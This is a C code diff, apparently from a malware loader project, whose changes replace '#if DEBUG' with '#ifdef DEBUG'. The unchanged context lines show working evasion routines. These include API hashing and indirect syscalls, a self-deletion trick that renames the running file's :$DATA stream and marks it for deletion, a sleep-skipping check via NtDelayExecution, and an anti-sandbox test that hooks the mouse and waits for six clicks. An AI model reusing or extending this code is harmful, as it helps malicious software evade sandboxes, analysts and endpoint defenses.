@@ -16,7 +16,7 @@ extern API_HASHING g_Api;
 LRESULT CALLBACK HookEvent(INT nCode, WPARAM wParam, LPARAM lParam) {
 
 	if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
-#if DEBUG
+#ifdef DEBUG
 		PRINTA("[+] Mouse Click Recorded \n");
 #endif
 		g_dwMouseClicks++;
@@ -37,7 +37,7 @@ BOOL MouseClicksLogger() {
 		NULL
 	);
 	if (!g_hMouseHook) {
-#if DEBUG
+#ifdef DEBUG
 		PRINTA("[!] SetWindowsHookExW Failed With Error : %d \n", GetLastError());
 #endif
 	}
@@ -62,7 +62,7 @@ BOOL DeleteSelf() {
 	// Allocating enough buffer for the 'FILE_RENAME_INFO' structure
 	pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
 	if (!pRename) {
-#if DEBUG
+#ifdef DEBUG
 		PRINTA("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
 #endif
 		return FALSE;
@@ -83,7 +83,7 @@ BOOL DeleteSelf() {
 	//--------------------------------------------------------------------------------------------------------------------------
 	// Used to get the current file name
 	if (g_Api.pGetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
-#if DEBUG
+#ifdef DEBUG
 		PRINTA("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
 #endif
 		return FALSE;
@@ -94,23 +94,23 @@ BOOL DeleteSelf() {
 	// Opening a handle to the current file
 	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
-#if DEBUG
+#ifdef DEBUG
 		PRINTA("[!] CreateFileW [R] Failed With Error : %d \n", GetLastError());
 #endif
 		return FALSE;
 	}
-#if DEBUG
+#ifdef DEBUG
 	PRINTW(L"[i] Renaming :$DATA to %s  ...", NEW_STREAM);
 #endif
 
 	// Renaming the data stream
 	if (!g_Api.pSetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
-#if DEBUG
+#ifdef DEBUG
 		PRINTA("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
 #endif
 		return FALSE;
 	}
-#if DEBUG
+#ifdef DEBUG
 	PRINTW(L"[+] DONE \n");
 #endif
 
@@ -126,24 +126,24 @@ BOOL DeleteSelf() {
 		return TRUE;
 	}
 	if (hFile == INVALID_HANDLE_VALUE) {
-#if DEBUG
+#ifdef DEBUG
 		PRINTA("[!] CreateFileW [D] Failed With Error : %d \n", GetLastError());
 #endif
 		return FALSE;
 	}
 
-#if DEBUG
+#ifdef DEBUG
 	PRINTW(L"[i] DELETING ...");
 #endif
 
 	// Marking for deletion after the file's handle is closed
 	if (!g_Api.pSetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
-#if DEBUG
+#ifdef DEBUG
 		PRINTA("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
 #endif
 		return FALSE;
 	}
-#if DEBUG
+#ifdef DEBUG
 	PRINTW(L"[+] DONE \n");
 #endif
 
@@ -177,7 +177,7 @@ BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {
 	// Sleeping for 'dwMilliSeconds' ms
 	ConfS(g_Sys.NtDelayExecution.wSysC);
 	if ((STATUS = RunSys(FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {
-#if DEBUG
+#ifdef DEBUG
 		PRINTA("[!] NtDelayExecution Failed With Error : 0x%0.8X \n", STATUS);
 #endif
 		return FALSE;
@@ -189,7 +189,7 @@ BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {
 	if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
 		return FALSE;
 
-#if DEBUG
+#ifdef DEBUG
 	PRINTA("\n\t>> _T1 - _T0 = %d \n", (DWORD)(_T1 - _T0));
 
 	PRINTA("[+] DONE \n");
@@ -212,14 +212,14 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds) {
 	// Try 10 times, after that return FALSE
 	while (i <= 10) {
 
-#if DEBUG
+#ifdef DEBUG
 		PRINTA("[#] Monitoring Mouse-Clicks For %d Seconds - Need 6 Clicks To Pass\n", (dwMilliSeconds / 1000));
 #endif
 
 		// Creating a thread that runs 'MouseClicksLogger' function
 		ConfS(g_Sys.NtCreateThreadEx.wSysC);
 		if ((STATUS = RunSys(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, MouseClicksLogger, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
-#if DEBUG
+#ifdef DEBUG
 			PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
 #endif
 			return FALSE;
@@ -228,7 +228,7 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds) {
 		// Waiting for the thread for 'dwMilliSeconds'
 		ConfS(g_Sys.NtWaitForSingleObject.wSysC);
 		if ((STATUS = RunSys(hThread, FALSE, &DelayInterval)) != 0 && STATUS != STATUS_TIMEOUT) {
-#if DEBUG
+#ifdef DEBUG
 			PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
 #endif
 			return FALSE;
@@ -236,7 +236,7 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds) {
 
 		ConfS(g_Sys.NtClose.wSysC);
 		if ((STATUS = RunSys(hThread)) != 0) {
-#if DEBUG
+#ifdef DEBUG
 			PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
 #endif
 			return FALSE;
@@ -244,7 +244,7 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds) {
 
 		// Unhooking
 		if (g_hMouseHook && !g_Api.pUnhookWindowsHookEx(g_hMouseHook)) {
-#if DEBUG
+#ifdef DEBUG
 			PRINTA("[!] UnhookWindowsHookEx Failed With Error : %d \n", GetLastError());
 #endif
 			return FALSE;
